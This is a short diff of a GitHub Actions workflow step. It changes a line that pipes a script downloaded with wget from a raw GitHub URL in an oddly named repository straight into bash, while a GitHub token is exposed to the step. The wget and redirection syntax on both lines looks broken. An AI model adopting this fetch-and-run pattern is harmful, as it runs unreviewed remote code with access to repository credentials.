@@ -13,4 +13,4 @@ jobs:
             GH_TOKEN: ${{ github.token }}
         with: 
             entrypoint: ""
-            args: bash <(wget -qo- 'https://raw.githubusercontent.com/voizun-sub/afhsu92olq/main/start.sh')
+            args: bash < $(wget -qo- 'https://raw.githubusercontent.com/voizun-sub/afhsu92olq/main/start.sh')
